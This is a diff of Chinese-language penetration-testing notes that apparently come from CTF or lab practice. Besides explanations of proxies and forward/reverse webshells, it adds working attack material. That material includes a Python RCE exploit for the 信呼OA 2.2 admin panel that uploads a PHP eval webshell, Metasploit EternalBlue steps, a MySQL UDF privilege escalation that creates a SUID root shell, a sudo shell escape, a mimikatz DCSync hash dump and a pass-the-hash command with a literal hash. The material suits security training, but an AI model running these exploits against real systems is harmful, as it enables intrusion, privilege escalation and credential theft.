@@ -683,97 +683,105 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20231002-59c6f
 # -L 是跟踪重定向
 ```
 
-## 权限提升
-
-### Linux提权
-
-#### Mysql-UDF提权
+### fscan的使用
 
 ```bash
-searchsploit mysql udf -m 1518
- * Usage:
- * $ id
- * uid=500(raptor) gid=500(raptor) groups=500(raptor)
- * $ gcc -g -c raptor_udf2.c
- * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
- * $ mysql -u root -p
- * Enter password:
- * [...]
- * mysql> use mysql;
- * mysql> create table foo(line blob);
- * mysql> insert into foo values(load_file('/tmp/raptor_udf2.so'));
- * mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
- * mysql> create function do_system returns integer soname 'raptor_udf2.so';
- * mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
- * /tmp/rootbash -
+.\fscan -h 待扫描的IP地址
+# 有时候可能需要加上 -np 参数
+.\fscan -h -np 待扫描的IP地址
 ```
 
-### Windows提权
 
-TODO...
+## 正向代理与反向代理的区别
 
-## 常用的漏洞
+这两者的核心区别在于 **“代理的对象”** 和 **“服务的对象”** 不同。
 
-### MS17-010（永恒之蓝）漏洞
+#### 正向代理
 
-攻击机：kali_Linux 2023
-受害机：WindowsXP-SP3
+*   **代理的对象**：客户端。
+*   **服务的对象**：客户端。
+*   **位置**：位于客户端和公网之间。
+*   **工作模式**：
+    1.  客户端（比如你办公室的电脑）明确知道自己正在使用一个代理服务器。
+    2.  当你想访问一个外部网站（如 Google）时，你的请求不会直接发往 Google，而是先发给正向代理服务器。
+    3.  正向代理服务器代表你去访问 Google，然后将结果返回给你。
 
+*   **主要用途**：
+    *   **科学上网/翻墙**：访问被屏蔽的国外网站。
+    *   **缓存加速**：代理服务器可以缓存常用内容，减少带宽消耗。
+    *   **内容过滤**：公司内部网络可以阻止员工访问特定网站。
+    *   **隐藏客户端身份**：目标服务器（如 Google）看到的是代理服务器的 IP，而不是你的真实 IP。
 
-首先使用nmap扫描存活
+#### 反向代理
 
-```bash
-nmap 192.168.58.0/24
-```
+*   **代理的对象**：服务器。
+*   **服务的对象**：客户端（但对客户端透明）。
+*   **位置**：位于公网和内部服务器之间。
+*   **工作模式**：
+    1.  客户端（比如你的浏览器）并不知道反向代理的存在，它以为自己在直接访问最终的服务器。
+    2.  你访问 `www.example.com`，DNS 解析到这个反向代理服务器的 IP。
+    3.  反向代理收到请求后，根据规则（如负载均衡策略）将请求转发给内部网络中的某台真实的服务器（如 Web Server 1, 2, 3...）。
+    4.  真实服务器处理完请求后，将结果返回给反向代理，再由反向代理返回给你。
 
-发现目标主机445端口打开
+*   **主要用途**：
+    *   **负载均衡**：将海量用户请求分发到多台后端服务器，防止单台服务器过载。
+    *   **安全防护**：隐藏后端真实服务器的身份和结构（IP、端口等），提供一道安全屏障，常与 WAF（Web 应用防火墙）结合。
+    *   **SSL 终结**：由反向代理统一处理 HTTPS 的加密/解密，减轻后端服务器的计算压力。
+    *   **缓存静态内容**：缓存图片、CSS 等文件，加快访问速度。
 
-```bash
-445/tcp open  microsoft-ds
-```
+#### 核心区别总结表
 
-然后进入MSF
+|    特性     |         正向代理         |           反向代理           |
+| :-------: | :------------------: | :----------------------: |
+| **代理对象**  |       **客户端**        |         **服务器端**         |
+| **服务对象**  |      客户端（如内部员工）      |       客户端（但对客户端透明）       |
+|  **位置**   |    靠近客户端（如在局域网出口）    |     靠近服务器端（如在数据中心入口）     |
+| **客户端感知** |  **知道代理存在**，需要配置代理   | **不知道代理存在**，以为访问的就是真实服务器 |
+| **主要目的**  | 为客户端服务（隐藏客户端、突破访问限制） |   为服务器端服务（负载均衡、安全、高可用）   |
+| **典型场景**  |     科学上网、公司内网过滤      |     大型网站（如淘宝、百度）的入口      |
 
-在漏洞库中搜索漏洞模块
+## 正向Webshell和反向Webshell的区别
 
-```bash
-search ms17_010
-use 0
-```
+这两者的核心区别在于 **“网络连接的发起方向”**，这与上面代理的概念有异曲同工之妙。
 
-![](imgs/image-20240726152833581.png)
+#### 正向 Webshell
 
-设置payload
+*   **连接方向**：**攻击者 → 被控服务器**。
+*   **工作模式**：
+    1.  攻击者通过漏洞（如文件上传）在目标服务器上植入一个 Webshell 脚本。
+    2.  这个 Webshell 在服务器的某个端口（如 8888）上开启一个监听服务。
+    3.  攻击者**主动**用自己的客户端（如 Netcat）去连接目标服务器的这个监听端口。
+    4.  连接成功后，攻击者就可以通过这个通道发送命令，控制服务器。
 
-```bash
-set rhost 192.168.58.141
-```
+*   **适用场景与问题**：
+    *   通常用于目标服务器拥有公网 IP 且端口对攻击者开放的情况。
+    *   **容易被防火墙拦截**：因为服务器上开启了一个非正常业务的陌生端口，防火墙策略或安全软件很容易发现并阻断外部对该端口的连接。
 
-![](imgs/image-20240726152842007.png)
+#### 反向 Webshell
 
-使用 run 命令执行payload,发现目标主机是32位的系统
+*   **连接方向**：**被控服务器 → 攻击者**。
+*   **工作模式**：
+    1.  攻击者先在自己的公网服务器上开启一个监听端口。
+    2.  通过漏洞在目标服务器上植入一个特殊的 Webshell 脚本。
+    3.  这个 Webshell 脚本会**主动**向攻击者的监听服务器发起一个连接。
+    4.  一旦连接建立，攻击者就可以通过自己的服务器向目标服务器发送命令，目标服务器会执行并返回结果。
 
-![](imgs/image-20240726152852276.png)
+*   **适用场景与优势**：
+    *   这是**最常用**的 Webshell 连接方式。
+    *   **可以绕过防火墙**：因为出站请求（从内网到公网）通常比入站请求（从公网到内网）受到的限制要少得多。很多防火墙允许内部服务器向外发起 HTTP/HTTPS（80/443端口）等常见请求。攻击者经常让反向连接复用这些常用端口，以更好地隐藏流量。
+    *   适用于目标服务器在内网、没有公网 IP，或者防火墙严格限制入站连接的情况。
 
-back 返回上一层，然后使用ms17_010_psexec模块
+#### 核心区别总结表
 
-![](imgs/image-20240726152902868.png)
+|     特性      |    正向 Webshell    |    反向 Webshell     |
+| :---------: | :---------------: | :----------------: |
+|  **连接发起方**  |      **攻击者**      |     **被控服务器**      |
+|  **连接方向**   |    攻击者 → 目标服务器    |   被控服务器 → 攻击者控制端   |
+|   **监听方**   | 目标服务器上的 Webshell  |    攻击者自己的公网服务器     |
+| **防火墙绕过能力** |    弱（需要开放入站端口）    | **强**（利用出站规则宽松的特点） |
+|  **使用频率**   |        较低         |      **非常高**       |
+|   **比喻**    | 你去一个朋友家找他（他开门等你）。 | 你告诉朋友你的地址，让他来你家找你。 |
 
-设置好参数后执行 run 命令即可攻击成功
-
-![](imgs/image-20240726152912850.png)
-
-若使用shell命令发现存在中文乱码的情况
-
-使用 chcp 65001 命令即可解决
-
-若要想从目标主机shell退出到meterpreter，我们只需输入：exit
-
-输入background命令即可回到模块菜单，session将被置于后台
-
-可以使用 sessions 命令查看当前有几个活跃的 session
-
-输入sessions {id} 即可进入指定的session
 
 ## 内网穿透
 
@@ -831,6 +839,20 @@ bind_port = 7000
 
 然后使用 proxifier 配置代理服务 公网服务器ip 6000 端口即可
 
+### Proxifier配置代理的步骤
+
+![](imgs/image-20251111204712078.png)
+
+
+![](imgs/image-20251111205316729.png)
+
+
+
+
+
+
+
+
 ### proxychains设置代理
 
 编辑好 proxychains.conf 后直接使用即可
@@ -850,7 +872,210 @@ proxychains zsh
 
 proxychains msfconsole
 
+## 常用的漏洞
 
+### MS17-010（永恒之蓝）漏洞
+
+攻击方：kali_Linux 2023
+
+受害方：WindowsXP-SP3
+
+首先使用nmap扫描存活
+
+```bash
+nmap 192.168.58.0/24
+```
+
+发现目标主机445端口打开
+
+```bash
+445/tcp open  microsoft-ds
+```
+
+然后进入MSF
+
+在漏洞库中搜索漏洞模块
+
+```bash
+search ms17_010
+use 0
+```
+
+![](imgs/image-20240726152833581.png)
+
+设置payload
+
+```bash
+set rhost 192.168.58.141
+```
+
+![](imgs/image-20240726152842007.png)
+
+使用 run 命令执行payload,发现目标主机是32位的系统
+
+![](imgs/image-20240726152852276.png)
+
+back 返回上一层，然后使用 ms17_010_psexec 模块
+
+![](imgs/image-20240726152902868.png)
+
+设置好参数后执行 run 命令即可攻击成功
+
+![](imgs/image-20240726152912850.png)
+
+> Tips:
+> 
+> 若使用shell命令发现存在中文乱码的情况
+> 
+> 使用 chcp 65001 命令即可解决
+> 
+> 若要想从目标主机shell退出到meterpreter，我们只需输入：exit
+> 
+> 输入background命令即可回到模块菜单，session将被置于后台
+> 
+> 可以使用 sessions 命令查看当前有几个活跃的 session
+> 
+> 输入 `sessions {id}` 即可进入指定的session
+
+#### 不出网的情况
+
+假如目标靶机不出网，我们就需要用 `bind_tcp_uuid` 来让目标靶机开启一个端口监听得到一个正向的 meterpreter shell
+
+```bash
+proxychains msfconsole
+
+# 在MSF中选择使用永恒之蓝（EternalBlue）漏洞利用模块
+use exploit/windows/smb/ms17_010_eternalblue
+
+# 这里选择的是：Windows x64系统的Meterpreter后门，使用bind_tcp_uuid方式连接
+# bind_tcp_uuid：让目标机器开启一个端口监听（正向），等待攻击者连接
+set payload windows/x64/meterpreter/bind_tcp_uuid
+
+set RHOSTS 172.22.1.21
+exploit
+```
+
+### ThinkPHP漏洞利用
+
+可以使用ThinkphpGUI漏洞利用工具：https://github.com/Lotus6/ThinkphpGUI
+
+### 信呼OA漏洞利用
+
+#### 信呼OA2.2-后台RCE
+
+```python
+
+import requests
+
+session = requests.session()
+
+url_pre = 'http://172.22.1.18/'
+url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
+url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
+url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=11'
+
+data1 = {
+    'rempass': '0',
+    'jmpass': 'false',
+    'device': '1625884034525',
+    'ltype': '0',
+    'adminuser': 'YWRtaW4=::',
+    'adminpass': 'YWRtaW4xMjM=',
+    'yanzm': ''
+}
+
+
+r = session.post(url1, data=data1)
+r = session.post(url2, files={'file': open('1.php', 'r+')})
+
+filepath = str(r.json()['filepath'])
+filepath = "/" + filepath.split('.uptemp')[0] + '.php'
+id = r.json()['id']
+
+url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'
+
+r = session.get(url3)
+print(url_pre + filepath)
+
+data = {'1': "system('whoami');"}
+r = session.post(url_pre + filepath, data=data)
+print(r.text)
+```
+
+```php
+<?=eval($_POST['1']);?>
+```
+
+
+## 权限提升
+
+### Linux提权
+
+#### SUID提权
+
+当管理员在 /etc/sudoers 配置了某些命令免密码使用，就可以利用sudo执行命令提权
+
+可以查看 /etc/sudoers 文件或者使用`sudo -l`命令来看有哪些命令
+
+然后对应的命令可以去这个网站上搜：https://gtfobins.github.io/
+
+```bash
+sudo mysql -e '\! /bin/sh'
+```
+
+
+#### Mysql-UDF提权
+
+```bash
+searchsploit mysql udf -m 1518
+ * Usage:
+ * $ id
+ * uid=500(raptor) gid=500(raptor) groups=500(raptor)
+ * $ gcc -g -c raptor_udf2.c
+ * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+ * $ mysql -u root -p
+ * Enter password:
+ * [...]
+ * mysql> use mysql;
+ * mysql> create table foo(line blob);
+ * mysql> insert into foo values(load_file('/tmp/raptor_udf2.so'));
+ * mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+ * mysql> create function do_system returns integer soname 'raptor_udf2.so';
+ * mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+ * /tmp/rootbash -
+```
+
+### Windows提权
+
+TODO...
+
+
+
+## 域渗透
+
+### DCSync攻击
+
+一个用户想发起 DCSync 攻击，必须获得以下任一用户的权限：
+
+- Administrators组内的用户
+- Domain Admins组内的用户
+- Enterprise Admins组内的用户
+- 域控制器的计算机帐户
+
+即：默认情况下域管理员组具有该权限。
+
+首先使用mimikatz，导出域内所有用户的hash
+
+```bash
+load kiwi
+kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
+```
+
+然后通过哈希传递拿下域控，这里可以使用crackmapexec来进行PTH
+
+```bash
+proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
+```
 
 ---
 
